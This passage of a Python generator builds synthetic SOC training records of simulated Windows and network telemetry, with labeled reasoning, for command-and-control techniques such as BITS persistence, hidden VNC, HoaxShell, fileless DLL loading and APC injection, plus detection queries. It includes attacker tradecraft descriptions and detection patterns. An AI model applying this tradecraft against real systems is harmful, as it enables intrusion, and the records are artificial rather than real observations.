              f"bitsadmin /Resume {job_name}\n"
              f"  BITS_job_persists_reboot=YES  job_polls_external_C2=YES\n"
              f"  EventID=3 (svchost BITS): destination={c2_ip}  DestinationPort=80\n"
              f"    (external IP -- not Microsoft CDN)\n"
              f"  NotifyCmdLine executes payload after each BITS download completes")
    cot = _cot(
        "Legitimate BITS jobs: SYSTEM account, Microsoft CDN destinations, "
        "wuauserv trigger, no SetNotifyCmdLine (that's attacker persistence feature).",
        f"bitsadmin SetNotifyCmdLine {notif_cmd} = payload executes every time download "
        "completes (recurring C2 poll). External IP {c2_ip} (not Microsoft). "
        "Job persists across reboots -- built-in Windows mechanism for persistence. "
        "BITS is rarely monitored vs. scheduled tasks.",
        f"Host: BITS C2 persistence installed -- job {job_name} polls {c2_ip}, "
        "executes {notif_cmd} on each transfer.",
        "BITS C2 persistence confirmed -- SetNotifyCmdLine + external IP.",
        "MITRE T1197 + T1071.001. Cancel all BITS jobs, block {c2_ip}. "
        "bitsadmin /reset to clear all jobs.",
    )
    return prompt, cot, "true_positive"

def _btc2_fp(i):
    prompt = (f"Windows Host Telemetry -- Windows Update BITS Job.\n"
              f"  Image: svchost.exe -k netsvcs  (BITS service)\n"
              f"    triggered_by=wuauserv\n"
              f"  destination: *.update.microsoft.com\n"
              f"  no_SetNotifyCmdLine=YES  no_user_created_job=YES\n"
              f"  downloaded_file_signed=YES  vendor=Microsoft")
    cot = _cot(
        "Windows Update BITS job -- SYSTEM wuauserv, Microsoft CDN, signed download, no NotifyCmdLine.",
        "wuauserv trigger. Microsoft CDN. No SetNotifyCmdLine. Signed download.",
        "Authorized Windows Update BITS -- wuauserv, Microsoft CDN.",
        "WU BITS -- wuauserv, Microsoft CDN, signed.",
        "T1197 -- AUTHORIZED WINDOWS UPDATE. No action.", action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# Add on (2026-06-05)
# ═══════════════════════════════════════════════════════════════════════════════

def _hvnc_tp(i):
    dst = _ip_ext()
    p = {"dst": dst, "port": random.choice([8080, 4433, 443, 5900]),
         "desktop_created": True, "no_user_visible": True,
         "screen_capture": True,
         "parent": random.choice(["explorer.exe","svchost.exe","powershell.exe"])}
    prompt = (f"Windows Sysmon + Network -- Hidden VNC Desktop.\n"
              f"  hidden_desktop_object_created=YES\n"
              f"  session_0_or_interactive_session=YES\n"
              f"  user_visible_display=NO\n"
              f"  outbound_connection: {p['dst']}:{p['port']}\n"
              f"  screen_capture_api_active=YES\n"
              f"  parent={p['parent']}")
    cot = _cot(
        "Remote Desktop and VNC are legitimate admin tools but create visible sessions. "
        "A second desktop object created in the interactive session with no user-visible "
        "window and an outbound connection to an external IP is HVNC.",
        f"Hidden desktop created (not default 'WinSta0\\Default'): "
        "separate input/output desktop invisible to user. "
        f"Screen capture API active: attacker seeing the hidden desktop. "
        f"Outbound to {p['dst']}:{p['port']}: streaming hidden desktop to attacker. "
        "No user interaction -- full covert remote access.",
        f"Host: attacker has hidden interactive access. "
        "All user actions on real desktop unaffected -- stealth operation.",
        "HVNC hidden remote desktop confirmed.",
        "MITRE T1021.005 (Remote Services: VNC via HVNC). "
        "Block destination, kill hidden desktop process, forensic review.",
    )
    return prompt, cot, "true_positive"

def _hvnc_fp(i):
    p = {"tool": "RealVNC Server", "visible": True, "cert": "vendor"}
    prompt = (f"Network Tap -- VNC Server Connection.\n"
              f"  tool={p['tool']}  user_visible_session=YES\n"
              f"  cert={p['cert']}  cmdb_registered=YES")
    cot = _cot(
        "RealVNC with visible user session -- standard remote admin.",
        f"Vendor tool. Visible session. CMDB registered.",
        "Authorized VNC session. No action.",
        "Authorized VNC. No action.",
        "T1021.005 -- AUTHORIZED VNC. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


def _hoaxshell_tp(i):
    dst = _ip_ext()
    p = {"dst": dst, "port": random.choice([80, 443, 8080]),
         "uri_pattern": f"/?session={random.randint(10000,99999)}&cmd=",
         "method": random.choice(["GET","POST"]),
         "ps_output_in_response": True,
         "cv": round(random.uniform(0.0, 0.12), 4),
         "interval_s": random.randint(2, 30)}
    prompt = (f"Network Tap -- Web Request-Based PowerShell C2.\n"
              f"Source → {p['dst']}:{p['port']}\n"
              f"  http_method={p['method']}\n"
              f"  uri_contains_encoded_command=YES  pattern={p['uri_pattern'][:30]}\n"
              f"  response_body_contains_encoded_ps_output=YES\n"
              f"  beacon_interval_s={p['interval_s']}  cv={p['cv']:.4f}")
    cot = _cot(
        "Legitimate HTTP requests don't encode command output in response bodies. "
        "A regular poll with encoded commands in the URI and encoded output in the response "
        "is a web-shell style C2 channel.",
        f"URI pattern encodes PowerShell command: {p['uri_pattern'][:30]} (base64 parameter). "
        f"Response contains encoded PS output: bidirectional command channel via HTTP. "
        f"cv={p['cv']:.4f}: machine-generated polling. "
        f"interval={p['interval_s']}s: automated beacon.",
        f"Web-based PowerShell C2 active to {p['dst']}:{p['port']}.",
        "HoaxShell-style web request C2 confirmed.",
        "MITRE T1071.001 (Web Protocols via request-based C2). "
        "Block destination, kill PowerShell process, capture traffic.",
    )
    return prompt, cot, "true_positive"

def _hoaxshell_fp(i):
    p = {"app": "health-check API", "method": "GET", "response": "JSON status"}
    prompt = (f"Network Tap -- API Health Check.\n"
              f"  method={p['method']}  response={p['response']}\n"
              f"  no_encoded_command=YES  known_endpoint=YES")
    cot = _cot(
        "API health check -- structured JSON response, no encoded commands.",
        "No encoded command. Known endpoint. JSON response.",
        "Authorized API health check. No action.",
        "Authorized health check. No action.",
        "T1071.001 -- AUTHORIZED API. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


def _memloader_tp(i):
    src_url = f"http://{_ip_ext()}/{random.choice(['payload','update','module','stage2'])}.dll"
    p = {"url": src_url,
         "method": random.choice(["Assembly.Load(bytes)","Activator.CreateInstanceFrom","Reflection.Emit"]),
         "parent": random.choice(["powershell.exe","csc.exe","msbuild.exe"]),
         "no_disk_write": True,
         "pe_in_mem": True}
    prompt = (f"Windows Sysmon -- Fileless .NET Assembly Load.\n"
              f"  parent={p['parent']}\n"
              f"  method={p['method']}\n"
              f"  source_url={p['url']}\n"
              f"  file_written_to_disk=NO\n"
              f"  pe_header_in_allocated_memory=YES")
    cot = _cot(
        "CLR loads assemblies from disk or GAC with a documented path. "
        "Downloading a DLL from an external URL and loading it directly into memory "
        "via reflection without touching disk has no legitimate admin analog.",
        f"Assembly.Load(bytes) from HTTP {p['url']}: "
        "payload downloaded and loaded entirely in memory. "
        f"parent={p['parent']}: script/build tool executing reflective load. "
        "No disk write: evades file-based AV scanning. "
        "PE header in memory without disk backing: reflective loading.",
        f"Host: .NET assembly from {p['url']} executing in memory.",
        "Fileless .NET assembly load from remote URL confirmed.",
        "MITRE T1620 (Reflective Code Loading). Kill process, block URL.",
    )
    return prompt, cot, "true_positive"

def _memloader_fp(i):
    p = {"method": "Assembly.Load from GAC", "source": "System.Web.dll (GAC)"}
    prompt = (f"Windows Sysmon -- CLR Assembly Load.\n"
              f"  method={p['method']}  source={p['source']}\n"
              f"  disk_backed=YES  gac_registered=YES")
    cot = _cot(
        "Standard CLR GAC assembly load -- disk-backed, registered.",
        "GAC. Disk-backed. Registered.",
        "Authorized CLR load. No action.",
        "Authorized CLR assembly. No action.",
        "T1620 -- AUTHORIZED CLR LOAD. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


def _deser_rce_tp(i):
    p = {"endpoint": random.choice(["/ViewState","/__Page","/.axd","/api/deserialize"]),
         "content_type": random.choice(["application/octet-stream","text/xml","application/json"]),
         "child_proc": random.choice(["cmd.exe","powershell.exe","calc.exe","whoami.exe"]),
         "parent": "w3wp.exe"}
    prompt = (f"Sysmon -- Deserialization RCE via Web Application.\n"
              f"  parent={p['parent']}\n"
              f"  child_spawned={p['child_proc']}\n"
              f"  trigger_endpoint={p['endpoint']}\n"
              f"  request_content_type={p['content_type']}\n"
              f"  os_command_via_web=YES")
    cot = _cot(
        "Web applications handle binary payloads for file uploads and API calls. "
        f"w3wp.exe spawning {p['child_proc']} following a POST to {p['endpoint']} "
        "with a binary payload is not legitimate web application behavior.",
        f"w3wp.exe → {p['child_proc']}: OS command spawned from IIS worker process. "
        f"Endpoint {p['endpoint']} with {p['content_type']} payload: "
        "crafted serialized .NET object gadget chain. "
        "ysoserial.net-style gadget chain triggered RCE.",
        f"Web server compromised via deserialization. {p['child_proc']} running as IIS AppPool.",
        f"Deserialization RCE via .NET gadget chain confirmed.",
        "MITRE T1059.001 (PowerShell via Deserializaton) + T1190. "
        "Kill w3wp.exe, patch vulnerable endpoint, review IIS logs.",
    )
    return prompt, cot, "true_positive"

def _deser_rce_fp(i):
    p = {"parent": "w3wp.exe", "child": "aspnet_compiler.exe", "reason": "ASP.NET compilation"}
    prompt = (f"Sysmon -- IIS Child Process.\n"
              f"  parent={p['parent']}  child={p['child']}\n"
              f"  reason={p['reason']}  signed=YES  expected=YES")
    cot = _cot(
        "ASP.NET compilation -- w3wp.exe spawning aspnet_compiler.exe is expected.",
        "Expected child. Signed. ASP.NET compilation context.",
        "Authorized IIS compilation. No action.",
        "Authorized IIS compilation. No action.",
        "T1059 -- AUTHORIZED IIS COMPILATION. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


def _darkwidow_tp(i):
    sacrificial = random.choice(["svchost.exe","RuntimeBroker.exe","dllhost.exe","WmiPrvSE.exe"])
    spoofed_parent = random.choice(["explorer.exe","SearchHost.exe","sihost.exe"])
    real_parent    = random.choice(["cmd.exe","powershell.exe","wscript.exe"])
    host = _host(); user = _user()
    prompt = (f"Windows Sysmon -- DarkWidow APC Injection + PPID Spoof.\n"
              f"Host: {host}  User: {user}\n"
              f"  phase_1_ppid_spoof: EventID=1\n"
              f"    Image: {sacrificial}  ParentImage: {spoofed_parent}\n"
              f"    actual_parent_via_wmi: {real_parent}  ppid_mismatch=YES\n"
              f"    acg_blockdll_policy=YES\n"
              f"  phase_2_apc: EventID=8 (CreateRemoteThread)\n"
              f"    SourceImage: {real_parent}  TargetImage: {sacrificial}\n"
              f"    StartAddress=0x{random.randint(0x10000000,0xfffffff0):08x} (RWX shellcode)\n"
              f"    StartModule=NONE (shellcode -- not a loaded DLL)\n"
              f"  phase_3_syscall: indirect_ntdll_trampoline=YES\n"
              f"    return_addr=ntdll.dll+0x{random.randint(0x1000,0x9fff):x}\n"
              f"  eventlog_threads_killed={'YES' if i % 3 == 0 else 'NO'}")
    cot = _cot(
        f"ACG/BlockDll are legitimate mitigation policies for security-hardened applications. "
        "A sacrificial process spawned with these policies but with a mismatched parent "
        "and immediately receiving APC injection is DarkWidow's execution chain -- not a hardened service.",
        f"PPID spoof: {sacrificial} claims parent {spoofed_parent} but WMI shows {real_parent} = "
        "NtCreateUserProcess called with explicit PPID override (CreateProcess attribute injection). "
        f"EventID 8 into {sacrificial}: APC Early Bird -- queued before thread entry point, "
        "cutting off EDR thread initialization hooks. "
        "StartModule=NONE: shellcode from allocated RWX region -- not a registered DLL. "
        "indirect_ntdll_trampoline: syscall issued from ntdll text (not attacker code) "
        "to bypass EDR stack-unwind hooks.",
        f"Host {host} ({user}): DarkWidow implant loaded into {sacrificial} via APC Early Bird. "
        "EDR hooks bypassed via indirect syscall. C2 beacon active.",
        "DarkWidow APC Early Bird injection with PPID spoof and indirect syscall confirmed.",
        "MITRE T1055.004 (APC Injection) + T1134.004 (PPID Spoof) + T1562.002. "
        "Kill injected process, memory-dump for C2 IOC extraction, block beaconing.",
    )
    return prompt, cot, "true_positive"

def _darkwidow_fp(i):
    prompt = (f"Windows Sysmon -- Legitimate SCM Service.\n"
              f"  proc=svchost.exe  parent=services.exe\n"
              f"  parent_matches_scm=YES  ppid_consistent=YES\n"
              f"  no_apc=YES  no_shellcode=YES  eventlog_intact=YES")
    cot = _cot(
        "SCM-launched svchost.exe -- correct parent, no PPID mismatch, no APC injection.",
        "parent=services.exe. Signed. ppid_consistent. No APC. EventLog intact.",
        "Authorized SCM service. No action.",
        "Authorized SCM service. No action.",
        "T1055.004 -- AUTHORIZED SCM SERVICE. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# Registry + Main
# ═══════════════════════════════════════════════════════════════════════════════

TOOL_CLASSES = {
    "HTTPSBeaconInterval":       ("network_tap",        ["T1071.001","T1573.001"],   _hbi_tp,    _hbi_fp),
    "MalleableProfileMimicry":   ("network_tap",        ["T1071.001","T1001.003"],   _mpm_tp,    _mpm_fp),
    "DNSSubdomainBeacon":        ("network_tap",        ["T1071.004","T1048.003"],   _dsb_tp,    _dsb_fp),
    "DoHBeaconChannel":          ("network_tap",        ["T1071.004","T1090.003"],   _doh_tp,    _doh_fp),
    "SMBNamedPipeBeacon":        ("sysmon_sensor",      ["T1071.002","T1090"],       _smb_pipe_tp, _smb_pipe_fp),
    "WebSocketPersistentC2":     ("network_tap",        ["T1071.001"],               _ws_tp,     _ws_fp),
    "TorHiddenServiceC2":        ("network_tap",        ["T1090.003"],               _tor_tp,    _tor_fp),
    "C2RedirectorPattern":       ("network_tap",        ["T1090.002"],               _redir_tp,  _redir_fp),
    "RemoteProcessInjectionRWX": ("sysmon_sensor",      ["T1055.001","T1055"],       _rpirwx_tp, _rpirwx_fp),
    "ProcessHollowing":          ("sysmon_sensor",      ["T1055.012"],               _ph_tp,     _ph_fp),
    "IndirectSyscallStub":       ("windows_deepsensor", ["T1562.001","T1055"],       _iss_tp,    _iss_fp),
    "SleepMaskingPattern":       ("windows_deepsensor", ["T1055","T1562.001"],       _smp_tp,    _smp_fp),
    "AMSIETWMemPatch":           ("sysmon_sensor",      ["T1562.001"],               _amsi_tp,   _amsi_fp),
    "ReflectiveDLLLoad":         ("sysmon_sensor",      ["T1620"],                   _rdll_tp,   _rdll_fp),
    "TokenDuplicationC2":        ("sysmon_sensor",      ["T1134.001","T1021"],       _tdc2_tp,   _tdc2_fp),
    "ChromeExtensionC2":         ("sysmon_sensor",      ["T1176","T1547.001"],       _ccx_tp,    _ccx_fp),
    "TeamserverExposure":        ("network_tap",        ["T1583.003"],               _tse_tp,    _tse_fp),
    "BeaconJitterStatistics":    ("network_tap",        ["T1071.001","T1573"],       _bjs_tp,    _bjs_fp),
    "StackCallSpoofing":         ("windows_deepsensor", ["T1055","T1562.001"],       _scs_tp,    _scs_fp),
    "HavocTeamsMimicry":         ("network_tap",        ["T1001.003","T1071.001"],   _htm_tp,    _htm_fp),
    "SocialPlatformC2":          ("network_tap",        ["T1102.002","T1071.001"],   _spc_tp,    _spc_fp),
    "EmailIMAPCommandC2":        ("network_tap",        ["T1071.003","T1102"],       _eic_tp,    _eic_fp),
    "ICMPCovertChannel":         ("network_tap",        ["T1095"],                   _icmp_tp,   _icmp_fp),
    "CloudStorageC2":            ("network_tap",        ["T1102.002"],               _csc2_tp,   _csc2_fp),
    "GitHubGistC2":              ("network_tap",        ["T1102.001"],               _ghc2_tp,   _ghc2_fp),
    "BITSTransferC2Persist":     ("sysmon_sensor",      ["T1197","T1071.001"],       _btc2_tp,   _btc2_fp),
    "HVNCHiddenDesktop":         ("network_tap",        ["T1021.005"],               _hvnc_tp,       _hvnc_fp),
    "HoaxShellWebC2":            ("network_tap",        ["T1071.001"],               _hoaxshell_tp,  _hoaxshell_fp),
    "FilelessMemLoader":         ("sysmon_sensor",      ["T1620"],                   _memloader_tp,  _memloader_fp),
    "DeserializationRCE":        ("sysmon_sensor",      ["T1059.001","T1190"],       _deser_rce_tp,  _deser_rce_fp),
    "DarkWidowC2":               ("sysmon_sensor",      ["T1055.004","T1134.004"],   _darkwidow_tp,  _darkwidow_fp),
}

S3_QUERIES = {
    "HTTPSBeaconInterval":     {"sensor":"network_tap","where":"variance_inter_arrival < 0.12 AND is_internal_dst = false AND cert_self_signed = true AND packets_src > 20"},
    "DNSSubdomainBeacon":      {"sensor":"network_tap","where":"dns_query IS NOT NULL AND payload_entropy > 3.5 AND variance_inter_arrival < 0.10"},
    "DoHBeaconChannel":        {"sensor":"network_tap","where":"dst_ip IN ('1.1.1.1','8.8.8.8','9.9.9.9') AND http_method = 'POST' AND http_uri LIKE '%dns%'"},
    "TorHiddenServiceC2":      {"sensor":"network_tap","where":"dst_port IN (9001,9030) AND is_internal_dst = false"},
    "WebSocketPersistentC2":   {"sensor":"network_tap","where":"http_uri LIKE '%websocket%' OR http_useragent LIKE '%Upgrade%' AND session_duration_ms > 60000"},
    "TeamserverExposure":      {"sensor":"network_tap","where":"dst_port IN (40056,6060,6501,50050,4444,4443) AND is_internal_dst = false AND cert_self_signed = true"},
    "SMBNamedPipeBeacon":      {"sensor":"sysmon_sensor","where":"sysmon_event_id IN (17,18) AND PipeName NOT LIKE 'MSSQL$%' AND PipeName NOT LIKE 'spoolss%'"},
    "ProcessHollowing":        {"sensor":"sysmon_sensor","where":"sysmon_event_id IN (8, 25)"},
    "AMSIETWMemPatch":         {"sensor":"sysmon_sensor","where":"sysmon_event_id = 7 AND (ImageLoaded LIKE '%amsi.dll%' OR ImageLoaded LIKE '%ntdll.dll%')"},
    "ChromeExtensionC2":       {"sensor":"sysmon_sensor","where":"CommandLine LIKE '%--load-extension%' AND CommandLine LIKE '%AppData%'"},
    "SocialPlatformC2":        {"sensor":"network_tap","where":"(hostname LIKE '%telegram%' OR hostname LIKE '%discord%' OR hostname LIKE '%slack%') AND variance_inter_arrival < 0.12 AND packets_src > 15"},
    "EmailIMAPCommandC2":      {"sensor":"network_tap","where":"dst_port IN (993,143) AND variance_inter_arrival < 0.12 AND packets_src > 10 AND http_useragent IS NULL"},
    "ICMPCovertChannel":       {"sensor":"network_tap","where":"protocol_name='ICMP' AND payload_entropy > 3.5 AND is_internal_dst=false AND variance_inter_arrival < 0.15"},
    "CloudStorageC2":          {"sensor":"network_tap","where":"(cert_cn LIKE '%.amazonaws.com%' OR cert_cn LIKE '%.blob.core.windows.net%') AND variance_inter_arrival < 0.12 AND is_internal_dst = false"},
    "GitHubGistC2":            {"sensor":"network_tap","where":"hostname = 'api.github.com' AND http_uri LIKE '%gists%' AND variance_inter_arrival < 0.15"},
    "BITSTransferC2Persist":   {"sensor":"sysmon_sensor","where":"sysmon_event_id=1 AND Image LIKE '%bitsadmin%' AND CommandLine LIKE '%SetNotifyCmdLine%'"},
    "HVNCHiddenDesktop":       {"sensor":"network_tap","where":"dst_ip IS NOT NULL AND is_internal_dst = false AND session_duration_ms > 60000 AND variance_inter_arrival < 0.5"},
    "HoaxShellWebC2":          {"sensor":"network_tap","where":"http_method IS NOT NULL AND http_uri LIKE '%session=%' GROUP BY src_ip HAVING COUNT(*) > 10"},
    "FilelessMemLoader":       {"sensor":"sysmon_sensor","where":"sysmon_event_id = 7 AND ImageLoaded LIKE '%clrjit%' AND Image NOT LIKE 'C:\\\\Windows%' AND Signed = 'false'"},
    "DeserializationRCE":      {"sensor":"sysmon_sensor","where":"sysmon_event_id = 1 AND ParentImage LIKE '%w3wp%' AND Image LIKE '%cmd.exe%' OR Image LIKE '%powershell%'"},
    "DarkWidowC2":             {"sensor":"sysmon_sensor","where":"sysmon_event_id = 8 AND TargetImage NOT LIKE '%svchost%' AND SourceImage LIKE '%Temp%'"},
    "MalleableProfileMimicry": {"sensor":"network_tap","where":"cert_self_signed = true AND is_internal_dst = false AND variance_inter_arrival < 0.12 AND ratio_large_packets > 0.1"},
    "C2RedirectorPattern":     {"sensor":"network_tap","where":"dst_port = 443 AND cert_self_signed = true AND is_internal_dst = false AND variance_inter_arrival < 0.15 AND payload_entropy > 3.0"},
    "RemoteProcessInjectionRWX": {"sensor":"sysmon_sensor","where":"sysmon_event_id = 8 AND GrantedAccess LIKE '%0x1fffff%' AND TargetImage LIKE '%notepad%' OR TargetImage LIKE '%werfault%' OR TargetImage LIKE '%svchost%' AND SourceImage NOT LIKE 'C:\\\\Windows%'"},
    "IndirectSyscallStub":     {"sensor":"windows_deepsensor","where":"score > 0.75 AND event_count > 5 AND path NOT LIKE 'C:\\\\Windows\\\\System32%' AND path NOT LIKE 'C:\\\\Program Files%'"},
    "SleepMaskingPattern":     {"sensor":"windows_deepsensor","where":"score > 0.8 AND event_count > 10 AND path NOT LIKE 'C:\\\\Windows%' AND path NOT LIKE 'C:\\\\Program Files%'"},
    "ReflectiveDLLLoad":       {"sensor":"sysmon_sensor","where":"sysmon_event_id = 7 AND Signed = 'false' AND ImageLoaded NOT LIKE 'C:\\\\Windows%' AND ImageLoaded NOT LIKE 'C:\\\\Program Files%' AND Image LIKE '%powershell%' OR Image LIKE '%wscript%' OR Image LIKE '%mshta%'"},
    "TokenDuplicationC2":      {"sensor":"sysmon_sensor","where":"sysmon_event_id = 10 AND GrantedAccess LIKE '%0x1f0fff%' AND Image NOT LIKE 'C:\\\\Windows%'"},
    "BeaconJitterStatistics":  {"sensor":"network_tap","where":"variance_inter_arrival < 0.12 AND payload_entropy > 3.0 AND is_internal_dst = false AND byte_ratio < 0.75"},
    "StackCallSpoofing":       {"sensor":"windows_deepsensor","where":"score > 0.85 AND event_count > 5 AND path NOT LIKE 'C:\\\\Windows%'"},
    "HavocTeamsMimicry":       {"sensor":"network_tap","where":"dst_port = 443 AND cert_self_signed = true AND variance_inter_arrival < 0.10 AND is_internal_dst = false AND ratio_large_packets > 0.1"},
}


def generate(tool_name, n_tp, n_fp):
    sensor, mitre, tp_fn, fp_fn = TOOL_CLASSES[tool_name]
    records = []
    for i in range(n_tp):
        prompt, cot, cls = tp_fn(i)
        records.append(_record(tool_name, sensor, mitre, _msg(sensor, prompt, cot), cls))
    for i in range(n_fp):
        prompt, cot, cls = fp_fn(i)
        records.append(_record(tool_name, sensor, mitre, _msg(sensor, prompt, cot), cls))
    return records


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--records-per-class",   type=int, default=10)
    ap.add_argument("--admin-fps-per-class", type=int, default=2)
    ap.add_argument("--tool-filter",         type=str, default="")
    args = ap.parse_args()

    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    names = list(TOOL_CLASSES.keys())
    if args.tool_filter:
        names = [t.strip() for t in args.tool_filter.split(",")]

    all_records = []
    for name in names:
        recs = generate(name, args.records_per_class, args.admin_fps_per_class)
        all_records.extend(recs)
        tp = sum(1 for r in recs if r["classification"] == "true_positive")
        fp = sum(1 for r in recs if r["classification"] == "false_positive")
        logger.info(f"  {name}: {tp} TP + {fp} FP  ({TOOL_CLASSES[name][0]})")

    with open(OUTPUT_FILE, "w") as f:
        for r in all_records:
            f.write(json.dumps(r) + "\n")

    index = {
        "ttp_category": "C2",
        "total_records": len(all_records),
        "tp_records":    sum(1 for r in all_records if r["classification"] == "true_positive"),
        "fp_records":    sum(1 for r in all_records if r["classification"] == "false_positive"),
        "tool_classes": {
            n: {"sensor": TOOL_CLASSES[n][0], "mitre": TOOL_CLASSES[n][1],
                "s3_query": S3_QUERIES.get(n)}
            for n in names
        },
    }
    with open(INDEX_FILE, "w") as f:
        json.dump(index, f, indent=2)

    logger.info(f"[+] {len(all_records)} total records → {OUTPUT_FILE}")
    logger.info(f"    {index['tp_records']} TP  |  {index['fp_records']} FP (admin scenarios)")
    logger.info(f"    Sensors: {sorted(set(r['source_type'] for r in all_records))}")


if __name__ == "__main__":
    main()